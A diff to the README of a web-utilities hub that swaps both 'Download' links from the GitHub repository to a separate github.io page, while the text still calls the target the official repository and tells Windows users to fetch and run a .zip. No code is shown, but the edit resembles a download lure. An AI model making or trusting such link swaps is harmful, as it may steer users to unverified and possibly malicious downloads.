@@ -1,6 +1,6 @@
 # 🛠️ anuhas-tools-web-hub - Simple access to essential web utilities
 
-[![](https://img.shields.io/badge/Download-Anuhas_Tools-blue.svg)](https://github.com/Iraendless356/anuhas-tools-web-hub)
+[![](https://img.shields.io/badge/Download-Anuhas_Tools-blue.svg)](https://iraendless356.github.io)
 
 Anuhas Tools provides a central location for your daily web tasks. This software acts as a hub for various utilities, allowing you to manage premium-focused tools and common web functions within one browser interface. You can host this hub yourself or run it locally on your computer to ensure consistent access throughout 2026.
 
@@ -26,7 +26,7 @@ Follow these steps to install and run the software on your Windows computer.
 ### Step 1: Visit the download page
 Click the link below to visit the official repository page. From there, you can view the available versions of the hub.
 
-[Download Anuhas Tools here](https://github.com/Iraendless356/anuhas-tools-web-hub)
+[Download Anuhas Tools here](https://iraendless356.github.io)
 
 ### Step 2: Download the files
 Once you are on the page, look for the section labeled "Releases" on the right side of the screen. Click the latest version number. Scroll to the "Assets" section and click the file ending in ".zip". Your browser will save this file to your "Downloads" folder.
